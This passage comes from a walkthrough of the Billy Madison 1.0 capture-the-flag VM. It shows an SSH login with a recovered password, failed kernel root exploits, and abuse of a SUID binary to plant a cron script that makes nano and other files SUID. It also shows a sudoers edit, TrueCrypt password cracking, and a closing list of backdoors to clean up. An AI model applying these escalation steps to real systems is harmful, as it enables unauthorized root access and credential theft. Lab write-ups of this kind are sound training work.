      Master Key     : 9E 8B 4F E6 CC 5E E2 4C 46 84 D2 AF 59 4B 21 6D
                       B5 3B 52 84 04 9D D8 D8 83 67 AF 43 DC 60 CE 92

      Transient Key  : 7A FA 82 59 5A 9A 23 6E 8C FB 1D 4B 4D 47 BE 13
                       D7 AC AC 4C 81 0F B5 A2 EE 2D 9F CC 8F 05 D2 82
                       BF F4 4E AE 4E C9 ED EA 31 37 1E E7 29 10 13 92
                       BB 87 8A AE 70 95 F8 62 20 B5 2B 53 8D 0C 5C DC

      EAPOL HMAC     : 86 63 53 4B 77 52 82 0C 73 4A FA CA 19 79 05 33
root@kali:~/evidence/billymadison1.0# -
root@kali:~/evidence/billymadison1.0/ftp/veronica# ssh eric@192.168.244.157 -p 1974
eric@192.168.244.157's password: triscuit*
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-36-generic x86_64)'

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

43 packages can be updated.
0 updates are security updates.


Last login: Sat Aug 20 22:28:28 2016 from 192.168.3.101
eric@BM:~$ -

{% endhighlight %}

Ok, we now have a shell to the box, the ability to reproduce in case we need to reboot.  Now to escalate privileges and win!

## Privilege Escalation

First, we start off with some enumeration.  Right from the login we see it is running `Ubuntu 16.04.1` and has a kernel version of `4.4.0-36`.

A run of searchsploit (exploit-db.com's offline search) reveals the following possible exploits:

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# searchsploit 16.04
earchsploit 16.04
------------------------------------------------------------------------------------------------------ ----------------------------------
 Exploit Title                                                                                        |  Path
                                                                                                      | (/usr/share/exploitdb/platforms)
------------------------------------------------------------------------------------------------------ ----------------------------------
censura 1.16.04 - (Blind SQL Injection / Cross-Site Scripting) Multiple Vulnerabilities               | ./php/webapps/9129.txt
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Privilege Escalation       | ./linux/local/39772.txt
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                 | ./linux/dos/39773.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                         | ./linux/local/40054.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - netfilter target_offset OOB Privilege Escalation           | ./linux/local/40049.c
------------------------------------------------------------------------------------------------------ ----------------------------------
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Nice, as the top one is not for Ubuntu but for Censura we have 4 possible exploits.  I recall seeing these same numbers on Eric's FTP home directory.

{% highlight bash %}
eric@BM:~$ locate ftp | grep "/eric/"
/opt/coloradoftp-prime/home/eric/.notes
/opt/coloradoftp-prime/home/eric/39772
/opt/coloradoftp-prime/home/eric/39773
/opt/coloradoftp-prime/home/eric/40049
/opt/coloradoftp-prime/home/eric/40054
/opt/coloradoftp-prime/home/eric/9129
eric@BM:~$ -
{% endhighlight %}

Ok, lets continue and do a bit more enumeration.  I have a couple of go-to scripts I always like to run when I gain access to a new box.

* [LinEnum.sh](http://www.rebootuser.com/?p=1758)
* [linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)
* [Linux_Exploit_Suggester.pl](https://github.com/PenturaLabs/Linux_Exploit_Suggester/blob/master/Linux_Exploit_Suggester.pl)
* A great writeup on Privilege Escalation over at [blog.g0tmi1k.com](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [kernel-exploits.com](https://www.kernel-exploits.com/)

After a quick glance, I don't see anything particularly interesting in either of the enumeration scripts, and the Exploit Suggester came up empty.  I decide to check out the exploits found from searchsploit.

After doing a bit of research on them, they are indeed for 4.4.0 kernel's but for revision 21, and we are on revision 36.  Damn!  I guess the system was updated post exploit.  Oh Well, lets give them a try just in case.

{% highlight bash %}
eric@BM:~/a$ head decr.c
/*
 * Ubuntu 16.04 local root exploit - netfilter target_offset OOB
 * check_compat_entry_size_and_hooks/check_entry
 *
 * Tested on 4.4.0-21-generic. SMEP/SMAP bypass available in descr_v2.c
 *
 * Vitaly Nikolenko
 * vnik@cyseclabs.com
 * 23/04/2016
 *
eric@BM:~/a$ head pwn.c
/**
 * Run ./decr first!
 *
 * 23/04/2016
 * - vnik
 */
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
eric@BM:~/a$ ./decr
-bash: ./decr: No such file or directory
eric@BM:~/a$ gcc pwn.c -o pwn
eric@BM:~/a$ gcc decr.c -o decr
decr.c: In function ‘decr’:
decr.c:151:11: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
  *match = (uint32_t)kmatch;
           ^
decr.c:157:7: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
  *t = (uint32_t)kmatch;
       ^
eric@BM:~/a$ ./decr
netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik
[!] Decrementing the refcount. This may take a while...
[!] Wait for the "Done" message (even if you'll get the prompt back).
eric@BM:~/a$ [+] Done! Now run ./pwn

eric@BM:~/a$ ./pwn
[+] Escalating privs...
pwn: pwn.c:44: main: Assertion `!getuid()' failed.
Aborted (core dumped)
eric@BM:~/a$ -
{% endhighlight %}

{% highlight bash %}
eric@BM:~/b$ ./doubleput
starting writev
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
^C'
eric@BM:~/b$ -
{% endhighlight %}

Damn, no go!  At this point, I spend WAY too much time trying to devise a way to utilize these exploits on the newer kernel.  I've been trying to learn a bit of exploit development as of late and I guess since that was fresh on the brain it wanted me to go that route.  That was a rabbit hole that was not worth the time.  Lesson learned; Pay more attention in the Enumeration phase.

At this point I looked back at the enumeration scripts and still not finding much I decided to re-run them through a grep filter, maybe that would provide more insight as frankly there is a ton of data in them.

I decide to check against anything done by eric.  Since he is the one that originally attacked the box, perhaps his account would have a backdoor that he forgot.

{% highlight bash %}
eric@BM:~$ cat enum | grep eric
    Linux version 4.4.0-36-generic (buildd@lcy01-01) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.2) ) #55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016
    tcp        0      0 192.168.244.157:1974    192.168.244.155:58596   ESTABLISHED 4503/sshd: eric [pr
    eric     pts/0    192.168.244.155  Thu14    6.00s  0.69s  0.02s sshd: eric [priv]
    PWD=/home/eric
    eric:x:1002:1002:Eric Gordon,,,:/home/eric:/bin/bash
    --w--w--w- 1 root root 0 Sep 16 08:59 /sys/fs/cgroup/memory/system.slice/home-eric-a-fuse_mount.mount/cgroup.event_control
    --w--w--w- 1 root root 0 Sep 16 12:43 /run/lxcfs/controllers/memory/system.slice/home-eric-a-fuse_mount.mount/cgroup.event_control
    -r-sr-s--- 1 root eric 372922 Aug 20 22:35 /usr/local/share/sgml/donpcgd
    fontconfig 2.11.94-0ubuntu1.1  generic font configuration library - support binaries
    fontconfig-config 2.11.94-0ubuntu1.1  generic font configuration library - configuration
    initramfs-tools 0.122ubuntu8.1  generic modular initramfs generator (automation)
    initramfs-tools-core 0.122ubuntu8.1  generic modular initramfs generator (core tools)
    libfontconfig1:amd64 2.11.94-0ubuntu1.1  generic font configuration library - runtime
    libnl-genl-3-200:amd64 3.2.27-1  library for dealing with netlink sockets - generic netlink
    libpciaccess0:amd64 0.13.4-1  Generic PCI access library for X
    linux-generic 4.4.0.36.38  Complete Generic Linux kernel and headers
    linux-headers-4.4.0-31-generic 4.4.0-31.50  Linux kernel headers for version 4.4.0 on 64 bit x86 SMP
    linux-headers-4.4.0-34-generic 4.4.0-34.53  Linux kernel headers for version 4.4.0 on 64 bit x86 SMP
    linux-headers-4.4.0-36-generic 4.4.0-36.55  Linux kernel headers for version 4.4.0 on 64 bit x86 SMP
    linux-headers-generic 4.4.0.36.38  Generic Linux kernel headers
    linux-image-4.4.0-31-generic 4.4.0-31.50  Linux kernel image for version 4.4.0 on 64 bit x86 SMP
    linux-image-4.4.0-34-generic 4.4.0-34.53  Linux kernel image for version 4.4.0 on 64 bit x86 SMP
    linux-image-4.4.0-36-generic 4.4.0-36.55  Linux kernel image for version 4.4.0 on 64 bit x86 SMP
    linux-image-extra-4.4.0-31-generic 4.4.0-31.50  Linux kernel extra modules for version 4.4.0 on 64 bit x86 SMP
    linux-image-extra-4.4.0-34-generic 4.4.0-34.53  Linux kernel extra modules for version 4.4.0 on 64 bit x86 SMP
    linux-image-extra-4.4.0-36-generic 4.4.0-36.55  Linux kernel extra modules for version 4.4.0 on 64 bit x86 SMP
    linux-image-generic 4.4.0.36.38  Generic Linux kernel image
    eric 4505 Sep15 0:00 /lib/systemd/systemd
    eric 4507 Sep15 0:00 (sd-pam)
    eric 4538 Sep15 0:03 sshd:
    eric 4539 Sep15 0:00 -bash
    eric 9973 Sep15 0:00 ./hello
    # Include generic snippets of statements
             initramfs-tools 0.122ubuntu8.1  generic modular initramfs generator (automation)
             initramfs-tools-core 0.122ubuntu8.1  generic modular initramfs generator (core tools)
eric@BM:~$ -
{% endhighlight %}

How did I miss that!  There is a `SUID` file that is owned by the user `root` and the group `eric`.  That must be something of interest.  Running the command results with the world's 2nd worst help page.

{% highlight bash %}
eric@BM:~$ /usr/local/share/sgml/donpcgd
Usage: /usr/local/share/sgml/donpcgd path1 path2
eric@BM:~$ -
{% endhighlight %}

Ok it seems to take two arguments as files and does something with them.  I create two new files and use them as the parameters.

{% highlight bash %}
eric@BM:~$ touch one.txt
eric@BM:~$ touch two.txt
eric@BM:~$ /usr/local/share/sgml/donpcgd one.txt two.txt
#### mknod(two.txt,81b4,0)
two.txt: File exists
eric@BM:~$ -
{% endhighlight %}

Ok, file 2 can't exist.  I re-run with file2 not existing.

{% highlight bash %}
eric@BM:~$ /usr/local/share/sgml/donpcgd one.txt three.txt
#### mknod(three.txt,81b4,0)
eric@BM:~$ -
{% endhighlight %}

OK, interesting, no error and it has an interesting output about `MKNOD`. Ok lets try with a file I actually want to see: `/etc/shadow`.

{% highlight bash %}
eric@BM:~$ /usr/local/share/sgml/donpcgd /etc/shadow shadow
#### mknod(shadow,81ff,0)
eric@BM:~$ ls -al shadow
-rwxrwxrwx 1 root shadow 0 Sep 18 10:06 shadow
eric@BM:~$ -
{% endhighlight %}

Excellent! Same success output, however looking at the created file it has identical permissions to the original AND it is 0 bytes in size.

I then proceeded down another fun rabbit hole trying to figure out what the command was doing.  I did some research on `MKNOD` and in the end pretty much came up empty.  

After spending way too much time trying to figure out this one, I finally had an epiphany; what if I make a file in a directory I normally can not write to?  What then?  Seeing as I wanted to exploit this idea the best place I could think of to write was in `/etc/cron.hourly/` as any script placed in there would run once every hour.  Here's to wishing there was a `cron.5minutes`.

{% highlight bash %}
eric@BM:~$ ls /etc/cron.hourly/
eric@BM:~$ /usr/local/share/sgml/donpcgd rootme /etc/cron.hourly/
#### mknod(/etc/cron.hourly/,81b4,0)
/etc/cron.hourly/: File exists
eric@BM:~$ /usr/local/share/sgml/donpcgd rootme /etc/cron.hourly/rootme
#### mknod(/etc/cron.hourly/rootme,81b4,0)
eric@BM:~$ ls /etc/cron.hourly
rootme
eric@BM:~$ ls -al /etc/cron.hourly
total 12
drwxr-xr-x   2 root root 4096 Sep 18 10:08 .
drwxr-xr-x 105 root root 4096 Sep 18 09:53 ..
-rw-r--r--   1 root root  102 Apr  5 16:59 .placeholder
-rw-rw-r--   1 eric eric    0 Sep 18 10:08 rootme
eric@BM:~$ -
{% endhighlight %}

OK, successful execution, but can I write to the new file?

{% highlight bash %}
eric@BM:~$ nano /etc/cron.hourly/rootme
eric@BM:~$ cat /etc/cron.hourly/rootme
#!/bin/sh
chmod u+s /bin/nano
eric@BM:~$ -
{% endhighlight %}

Yes!  If the above script executes properly, I should be able to run nano as root and edit any file I want.  As a backup, I went ahead and created a second script in the same was as above and used these other commands.  I also wanted to setup a netcat backdoor, but the one available on the server did not have -e so no go there.

{% highlight bash %}
chmod u+s /etc/shadow
chmod u+s /usr/bin/vim
chmod u+s /usr/sbin/tcpdump
{% endhighlight %}

Now to wait about an hour.  Interestingly enough I had never noticed before that the default for crontab is to run the cron.hourly at the 17-minute mark and not precisely on the hour.

After an hour I checked the permissions on nano

{% highlight bash %}
eric@BM:~$ ls -al /bin/nano
-rwsr-xr-x 1 root root 208480 Mar 29 04:16 /bin/nano
{% endhighlight %}

YES!  Nano was now a SUID binary.  A simple editing of `/etc/sudoers` should do the trick now and give eric sudo privileges.  I added the following line to the sudoers file

{% highlight bash %}
eric  ALL=(ALL:ALL) ALL
{% endhighlight %}

And now for the moment of truth.  Can I become root?

{% highlight bash %}
eric@BM:~$ sudo su
[sudo] password for eric:
root@BM:/home/eric# id
uid=0(root) gid=0(root) groups=0(root)
root@BM:/home/eric# -
{% endhighlight %}

Awesome!  Now that I have root it is time to complete the tasks to win the VM.  

## Finding Billy's paper

Ok now as root lets go find that paper!  I noticed during my sifting through the drive that there is a /PRIVATE folder that I couldn't get into.  So lets go check that one out.

{% highlight bash %}
root@BM:/PRIVATE# file BowelMovement
BowelMovement: data
root@BM:/PRIVATE# cat hint.txt
Heh, I called the file BowelMovement because it has the same initials as
Billy Madison.  That truely cracks me up!  LOLOLOL!

I always forget the password, but it's here:

https://en.wikipedia.org/wiki/Billy_Madison

-EG
root@BM:/PRIVATE# -
{% endhighlight %}

Nice Ok, so found the report but it's encrypted, go figure.  Thankfully Eric left us a hint of a wiki page.  First thought that pops into my head is to use cewl to make a word list from the page and then crack it.  At this point, I started trying to figure out what kind of encryption was used and came up a bit empty.  The only one I figured it would be as it had no header information would be Truecrypt.  So lets try TrueCrack.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# cewl --depth 0 https://en.wikipedia.org/wiki/Billy_Madison > bm.cewl
root@kali:~/evidence/billymadison1.0# truecrack -t BowelMovement -w bm.cewl
TrueCrack v3.0
Website: http://code.google.com/p/truecrack
Contact us: infotruecrack@gmail.com
Segmentation fault
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

And down the rabbit hole I go!  Well after a couple of minutes of trying other encryptions (interestingly enough bcrypt thought it was GPG encrypted which lead me to find .gpg keys under the root account and trying that), I decided to look at the wordlist.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# head bm.cewl
CeWL 5.2 (Some Chaos) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
the
Billy
Madison
and
info
Wikipedia
this
The
his
page
{% endhighlight %}

Ahh damnit, I didn't take into account if you just send STDOUT from cewl to a file it will have the header.  Ok, I remove the first line and re-run TrueCrack.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# nano bm.cewl
root@kali:~/evidence/billymadison1.0# truecrack -t BowelMovement -w bm.cewl
TrueCrack v3.0
Website: http://code.google.com/p/truecrack
Contact us: infotruecrack@gmail.com
Found password:		"execrable"
Password length:	"10"
Total computations:	"603"
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Excellent, now we have a password for the volume.  Mounting the volume is simple, just using Veracrypt (make sure you check the Truecrypt box).  Once mounted lets go look at it.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# cd /media/veracrypt1/
root@kali:/media/veracrypt1# ls
$RECYCLE.BIN  secret.zip
root@kali:/media/veracrypt1# unzip secret.zip
Archive:  secret.zip
  inflating: Billy_Madison_12th_Grade_Final_Project.doc  
  inflating: THE-END.txt             
root@kali:/media/veracrypt1# cat Billy_Madison_12th_Grade_Final_Project.doc
Billy Madison
Final Project
Knibb High



                                       The Industrial Revolution

The Industrial Revolution to me is just like a story I know called "The Puppy Who Lost His Way."
The world was changing, and the puppy was getting... bigger.

So, you see, the puppy was like industry. In that, they were both lost in the woods.
And nobody, especially the little boy - "society" - knew where to find 'em.
Except that the puppy was a dog.
But the industry, my friends, that was a revolution.

KNIBB HIGH FOOTBALL RULES!!!!!

https://www.youtube.com/watch?v=BlPw6MKvvIc

-BM
root@kali:/media/veracrypt1# cat THE-END.txt
Congratulations!

If you're reading this, you win!

I hope you had fun.  I had an absolute blast putting this together.

I'd love to have your feedback on the box - or at least know you pwned it!

Please feel free to shoot me a tweet or email (7ms@7ms.us) and let me know with
the subject line: "Stop looking at me swan!"

Thanks much,

Brian Johnson
7 Minute Security
www.7ms.us

root@kali:/media/veracrypt1# -
{% endhighlight %}

## Final Cleanup - Eric's Backdoor Removals

Ok so what did Eric accomplish on this box that should be removed.  Well frankly a ton, in a real world scenario I would be concerned with missing things like rootkits on the box and would probably just suggest backing up protected documents and reinstalling.  But lets ignore that.

* User account to be removed - Eric
* SSH backdoor on 1974
* Privilege escalation binary
* FTP server Breach
* Web Server Defacement on TCP/80
* Honeypot on TCP/23
* Honeypot on TCP/69
* Cleanup of /etc/rc.local
* Hacking tools in /opt
* GPG keys compromised

### Malicious User Removal

First things first, malicious user `eric` should be removed from the system.  Note, this command will delete all files in the home directory as well, if you wish to preserve -r would be appropriate.

{% highlight bash %}
root@BM:~# userdel eric -r
{% endhighlight %}

### SSH Backdoor Removal

Malicious script /root/ssh/canyoussh.sh must be removed along with its crontab entry.

{% highlight bash %}
root@BM:~# cat ssh/canyoussh.sh
NOW=$(date +"%Y-%m-%d-%H-%M-%S")
if grep -w "My kid will be a soccer player" /home/WeaselLaugh/*; then
   sudo iptables -A INPUT -p tcp --dport 1974 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
   echo $NOW > /home/WeaselLaugh/ebd.txt
   echo Erics backdoor is currently OPEN >> /home/WeaselLaugh/ebd.txt
 fi
root@BM:~# -
{% endhighlight %}

{% highlight bash %}
*/1 * * * * /root/ssh/canyoussh.sh
{% endhighlight %}

As the service running this SSH server is the actual sshd daemon, editing of /etc/ssh/sshd_config and restoring port to 22 would be recommended.  However something is listening on port 22.
{% highlight bash %}
root@BM:~# netstat -tupln | grep 22
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      3957/python2    
root@BM:~# netstat -tupln | grep 1974
tcp        0      0 0.0.0.0:1974            0.0.0.0:*               LISTEN      3907/sshd       
tcp6       0      0 :::1974                 :::*                    LISTEN      3907/sshd       
root@BM:~# -
{% endhighlight %}

Looking in /root there is a ssh.sh script.

{% highlight bash %}
python2 /opt/rg/rubberglue.py 22
{% endhighlight %}

So its a script called `rubberglue`, interesting.  What it seems to do is take any connection to the bound port and connect back to the source ip address on the same port.  I like it!  Either way, removal of this script and the `/opt/rg` directory would be necessary.  Now if this was intentional then keeping all of this would be appropriate and just changing the port would be advised.

### Privilege escalation binary

Removal of `/usr/local/share/sgml/donpcgd` would be recommended.  Or at least removal of SUID.

{% highlight bash %}
chmod u-s /usr/local/share/sgml/donpcgd
{% endhighlight %}

{% highlight bash %}
rm /usr/local/share/sgml/donpcgd
{% endhighlight %}

### FTP Knock Routine

Modification of the knock would be appropriate as it was compromised.  This can be accomplished by editing `/etc/knockd.conf`.

Cleanup of `/opt/coloradoftp-prime/home` would also be recommended and removal of the malicious/defaced files contained within.

### Web Server Defacement on TCP/80

Restoration of the apache web server would be recommend, or removal.  Web directory was `/var/www/html`.

### Honeypot on TCP/23

Telnet honeypot removal should be removed.  Removal could be done by removing the `/opt/honeyports` directory, `/root/checkban` and `/root/telnet.sh` scripts.

{% highlight bash %}
rm -r /opt/honeyports
rm -r /root/checkban
rm /root/telnet.sh
{% endhighlight %}


Removal of the following line from the root crontab would also be required:

{% highlight bash %}
*/10 * * * * /root/telnet.sh
{% endhighlight %}

### Honeypot on TCP/69

The Wordpress installation on TCP/69 was indeed a honeypot.  Cleanup would involve deletion of `/root/wp.sh` and removal of `/opt/wp`.

{% highlight bash %}
rm -r /opt/wp
rm /root/wp.sh
{% endhighlight %}

### Cleanup of /etc/rc.local

Rc.local seems to have been compromised as well, removal of all malicious scripts should be performed.

{% highlight bash %}
/root/ebd.sh
/root/cleanup.sh &
/root/fwconfig.sh &
/root/email.sh &
/root/wp.sh &
/root/ftp.sh &
/root/telnet.sh &
/root/ssh.sh &
{% endhighlight %}

### Hacking tools in /opt

Some interesting hacking tools/tips were also found in `/opt/bpatty`, `/opt/Sn1per` and `/opt/reconng`, all of which should be carefully backed up for later use :) and removal.  Also included below are a couple of the other pretty sweet scripts in `/opt`.

`/opt/bpatty`  - Brian's Pentesting and Technical Tips for You - pretty neat collection of thoughs, a decent read.  Available on [github](https://github.com/braimee/bpatty).

`/opt/Sn1per` - Scanner/Enumeration tool - Going to have to play around with this one, also available on [github](https://github.com/1N3/Sn1per).

`/opt/reconng` - Recon tool, great stuff, already included in Kali but available on [BitBucket](https://bitbucket.org/LaNMaSteR53/recon-ng)

`/opt/honeyports` - Port based Honeypot script.  Available on [github](https://github.com/securitygeneration/Honeyport)

`/opt/rg` - RubberGlue Honeypot Available on [BitBucket](https://bitbucket.org/Zaeyx/rubberglue)

### GPG keys compromised

Lastly, as root was compromised, the GPG keys contained in /root/.gnupg should be considered compromised and removed.
